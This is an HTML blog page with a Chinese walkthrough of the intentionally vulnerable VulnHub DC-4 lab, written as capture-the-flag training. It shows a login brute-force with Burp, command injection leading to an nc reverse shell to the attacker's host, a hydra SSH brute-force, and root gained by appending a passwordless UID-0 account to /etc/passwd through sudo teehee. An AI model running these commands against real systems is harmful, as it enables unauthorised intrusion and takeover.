@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-DC_4-Walkthrough | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-DC_4-Walkthrough</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 29, 2020&nbsp;&nbsp;18:39:53</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
+<p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues</p>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>
+<p>这边靶机和前一个是一样的，只需要获取一个<code>Flag</code>就行了，在 <code>/root</code> 目录下!</p>
+<h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p><code>Burpsuite</code>枚举弱口令<br><code>命令执行</code>反弹shell<br><code>hydra</code>爆破<code>ssh</code><br><code>teehee</code>权限提升</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到 <code>IP</code> 先对它进行端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1206.png" alt="图片"></p>
+<p>这边扫描出来靶机开放了 <code>22</code>（ssh）、<code>80</code>（http）端口，先从 <code>80</code> 端口来入侵：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1207.png" alt="图片"></p>
+<h2 id="Burpsuite枚举弱口令"><a href="#Burpsuite枚举弱口令" class="headerlink" title="Burpsuite枚举弱口令"></a>Burpsuite枚举弱口令</h2><p>打开后发现是一个登陆的页面，我尝试了常规的弱口令 <code>admin</code>、<code>admin123</code> 无果，随后我又尝试了一遍 <code>SQL</code> 注入，并没有注入点！这个时候就需要掏出我的字典来了来配合 <code>Burp</code> 爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.100</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.1.100/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=lddqa4ven9a9qqf8ua9tlurj35</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=§123456§</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1208.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1209.png" alt="图片"></p>
+<p>爆破成功后得到密码 <code>happy</code>，随后拿着账号和密码登陆到了后台，在后台发现可以执行查看文件的操作：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1210.png" alt="图片"></p>
+<h2 id="命令执行反弹shell"><a href="#命令执行反弹shell" class="headerlink" title="命令执行反弹shell"></a>命令执行反弹shell</h2><p>这个时候想到了<code>命令执行</code>，<code>whoami</code> 看了看权限是一个网站普通权限：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1211.png" alt="图片"></p>
+<p>我们先用 <code>nc</code> 反弹一个 <code>shell</code> 回来把，<code>kali</code> 监听 <code>4444</code> 端口，在 <code>radio</code> 变量输入 <code>nc</code> 反弹的地址成功反弹一枚shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.1.128 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1212.png" alt="图片"></p>
+<p>我们先让它得到一个 <code>bash</code> 把：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="hydra爆破ssh"><a href="#hydra爆破ssh" class="headerlink" title="hydra爆破ssh"></a>hydra爆破ssh</h2><p>之后我是在 <code>/home/jim</code> 目录里发现了一个<code>历史密码</code>的<code>备份文件</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1213.png" alt="图片"></p>
+<p>既然得到了密码，那么就用<code>九头蛇</code>来爆破把：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P pass ssh://192.168.1.100 -t 10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1214.png" alt="图片"></p>
+<p>爆破成功后得到 <code>jim</code> 的密码为 <code>jibril04</code>，随后我登陆到了 <code>jim</code> 用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.1.100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1215.png" alt="图片"></p>
+<p>登陆之后我习惯性的 <code>sudo -l</code> 发现需要密码：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1216.png" alt="图片"></p>
+<p>紧接着我在 <code>jim</code> 的目录下发现了一个文件，文件里好像是一封邮件信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1217.png" alt="图片"></p>
+<p>好像没得啥子用处！最后我在邮箱目录找到了另一封邮件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1218.png" alt="图片"></p>
+<p>读完这封邮件我得到了 <code>charles</code> 告诉 <code>jim</code> 的一个重要信息，也就是 <code>charles</code> 的密码！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charles：^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+
+<p>获取到密码后我切换到了 <code>charles</code> 用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1219.png" alt="图片"></p>
+<h2 id="teehee权限提升"><a href="#teehee权限提升" class="headerlink" title="teehee权限提升"></a>teehee权限提升</h2><p>切换用户之后我又是习惯性的 <code>sudo -l</code> 发现 <code>charles</code> 用户可以以 <code>root</code> 身份去运行 <code>teehee</code>命令：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1220.png" alt="图片"></p>
+<p>我紧接着写入了一个 <code>saul</code> 账号到 <code>passwd</code> 里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;saul::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">#注释：</span><br><span class="line">#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1221.png" alt="图片"></p>
+<p>最后也是在 <code>/root</code> 目录下拿到了 <code>Flag</code> ～</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/02/29/Vulnhub-DC-4/">http://example.com/2020/02/29/Vulnhub-DC-4/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/03/Vulnhub-DC-5/">VulnHub通关日记-DC_5-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/27/Vulnhub-DC-3/">VulnHub通关日记-DC_3-Walkthrough</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
